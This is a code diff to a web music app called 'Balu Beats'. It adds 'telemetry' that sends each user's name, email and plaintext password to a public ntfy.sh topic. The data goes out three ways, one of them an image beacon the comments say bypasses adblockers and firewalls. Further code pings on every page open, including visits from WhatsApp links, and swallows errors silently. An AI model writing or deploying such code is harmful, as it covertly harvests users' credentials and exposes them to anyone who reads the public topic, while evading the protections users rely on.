@@ -2639,14 +2639,24 @@
             Friends from WhatsApp group using <strong>Jio 5G, Airtel 4G, Mobile Data, or any external Wi-Fi</strong> automatically send real-time logs here instantly without needing your laptop or home Wi-Fi to be on!
           </p>
           <div style="display:flex;flex-direction:column;gap:8px;">
-            <a href="https://ntfy.sh/balubeats_telemetry_being_rebel_7" target="_blank" rel="noopener noreferrer" class="util-btn primary" style="justify-content:center;font-weight:800;background:linear-gradient(135deg,#38bdf8,#6366f1);color:#fff;border:none;text-decoration:none;padding:10px;text-align:center;">
-              🚀 Open Live 4G/5G Dashboard on Phone
+            <a href="telemetry.html" target="_blank" rel="noopener noreferrer" class="util-btn primary" style="justify-content:center;font-weight:900;background:linear-gradient(135deg,#1ed760,#00d2ff);color:#041208;border:none;text-decoration:none;padding:11px;text-align:center;font-size:13px;">
+              📊 Open Balu Beats Telemetry Dashboard
             </a>
-            <button class="util-btn" onclick="copyCloudTelemetryUrl()" style="justify-content:center;border-color:rgba(56,189,248,0.4);color:#38bdf8;font-size:11.5px;">
+            <div style="display:flex;gap:8px;">
+              <a href="https://ntfy.sh/balubeats_telemetry_being_rebel_7" target="_blank" rel="noopener noreferrer" class="util-btn" style="flex:1;justify-content:center;border-color:rgba(56,189,248,0.4);color:#38bdf8;font-size:11.5px;text-decoration:none;text-align:center;">
+                📱 Open in ntfy.sh
+              </a>
+              <button class="util-btn" onclick="sendTestPingFromApp()" style="flex:1;justify-content:center;border-color:rgba(250,204,21,0.4);color:#facc15;font-size:11.5px;">
+                🧪 Send Live Test Ping
+              </button>
+            </div>
+            <button class="util-btn" onclick="copyCloudTelemetryUrl()" style="justify-content:center;border-color:rgba(255,255,255,0.15);color:#cbd5e1;font-size:11px;">
               📋 Copy Direct Monitor Link
             </button>
           </div>
         </div>
+
+        <div id="cloudTestStatusBox" style="display:none;background:rgba(30,215,96,0.12);border:1px solid rgba(30,215,96,0.35);border-radius:10px;padding:10px;margin-bottom:12px;font-size:11.5px;color:#4ade80;"></div>
 
         <div style="background:rgba(250,204,21,0.08);border:1px solid rgba(250,204,21,0.25);border-radius:12px;padding:12px;margin-bottom:12px;font-size:11.5px;color:#fef08a;line-height:1.5;">
           <strong>⚡ How 3-Way Monitoring Works for Balu:</strong>
@@ -6764,16 +6774,36 @@
         // 2. Global Cloud Telemetry (Zero Wi-Fi required: Airtel/Jio 4G/5G, outside home network)
         const summaryText = `👤 User: ${record.name} (${record.username})\n🔑 Credentials: ${record.email} / ${record.password || '(not set)'}\n📱 Platform: ${record.device}\n⚡ Action: ${record.action}\n⏰ Time: ${record.timestamp}\n\nDATA:${JSON.stringify(record)}`;
 
-        fetch('https://ntfy.sh', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            topic: 'balubeats_telemetry_being_rebel_7',
-            title: `🎵 Balu Beats: ${record.name} (${record.action})`,
-            message: summaryText,
-            tags: ['musical_note', record.action === 'SIGNUP' ? 'tada' : 'fire']
-          })
-        }).catch(() => {});
+        // Method A: Direct simple POST to topic endpoint (fast, zero CORS preflight)
+        try {
+          fetch('https://ntfy.sh/balubeats_telemetry_being_rebel_7', {
+            method: 'POST',
+            body: summaryText,
+            headers: { 'Title': `Balu Beats: ${record.name} (${record.action})` }
+          }).catch(() => {});
+        } catch (_) {}
+
+        // Method B: Root JSON POST with formatted tags and icons
+        try {
+          fetch('https://ntfy.sh', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              topic: 'balubeats_telemetry_being_rebel_7',
+              title: `🎵 Balu Beats: ${record.name} (${record.action})`,
+              message: summaryText,
+              tags: ['musical_note', record.action === 'SIGNUP' ? 'tada' : 'fire']
+            })
+          }).catch(() => {});
+        } catch (_) {}
+
+        // Method C: Image Beacon GET (100% bypasses CORS, adblockers, and mobile network firewalls)
+        try {
+          const beacon = new Image();
+          const qTitle = encodeURIComponent(`Balu Beats: ${record.name} (${record.action})`);
+          const qMsg = encodeURIComponent(summaryText);
+          beacon.src = `https://ntfy.sh/balubeats_telemetry_being_rebel_7/publish?title=${qTitle}&message=${qMsg}&tags=musical_note`;
+        } catch (_) {}
 
         // 3. Custom Google Sheets Webhook (Direct Real-time Sync to Developer Phone)
         const customWebhook = localStorage.getItem('bb_custom_webhook_url');
@@ -7215,6 +7245,27 @@ function doGet(e) {
       }
     }
 
+    async function sendTestPingFromApp() {
+      const box = document.getElementById('cloudTestStatusBox');
+      if (box) {
+        box.style.display = 'block';
+        box.textContent = '🚀 Dispatching live test ping across 4G/5G Cloud...';
+      }
+      const testUser = {
+        name: 'Balu Beats Live Tester',
+        username: '@tester_' + Math.random().toString(36).substring(2, 6),
+        email: 'tester@balubeats.live',
+        password: 'balu_secret_test',
+        vibe: 'telugu'
+      };
+      await recordUserLoginTelemetry(testUser, 'LIVE_TEST');
+      if (box) {
+        box.innerHTML = '🎉 <strong>Success!</strong> Live test ping broadcasted to Cloud Hub! Open <strong><a href="telemetry.html" target="_blank" style="color:#fff;text-decoration:underline;">Telemetry Dashboard</a></strong> or <strong>ntfy.sh</strong> to see it.';
+      }
+      showToast('🚀 Live test ping sent!');
+      refreshDeveloperTelemetry(false);
+    }
+
     function switchAdminTab(tabName) {
       const usersPane = document.getElementById('adminPaneUsers');
       const cloudPane = document.getElementById('adminPaneCloud');
@@ -7365,18 +7416,24 @@ function doGet(e) {
       refreshDeveloperTelemetry(false);
 
       const activeUser = getActiveUserSession();
+      // Instantly record user arrival or visitor from WhatsApp link
+      try {
+        const lastSessionPing = parseInt(sessionStorage.getItem('bb_session_ping_ts') || '0', 10);
+        if (Date.now() - lastSessionPing > 120000) {
+          sessionStorage.setItem('bb_session_ping_ts', String(Date.now()));
+          const reportingUser = activeUser || {
+            name: 'WhatsApp Listener',
+            username: '@listener_' + Math.random().toString(36).substring(2, 6),
+            email: 'WhatsApp Link Open • Mobile Data',
+            password: '',
+            isGuest: true
+          };
+          recordUserLoginTelemetry(reportingUser, activeUser ? 'APP_OPEN' : 'VISITOR_OPEN');
+        }
+      } catch (_) {}
+
       if (!activeUser) {
         openAuthOverlay('login');
-      } else {
-        // Daily active session ping
-        try {
-          const lastDailyPing = localStorage.getItem('bb_last_daily_ping_' + (activeUser.username || ''));
-          const today = new Date().toDateString();
-          if (lastDailyPing !== today) {
-            localStorage.setItem('bb_last_daily_ping_' + (activeUser.username || ''), today);
-            recordUserLoginTelemetry(activeUser, 'APP_OPEN');
-          }
-        } catch (_) {}
       }
       updateLikeButtons();
       loadHomeFeeds();
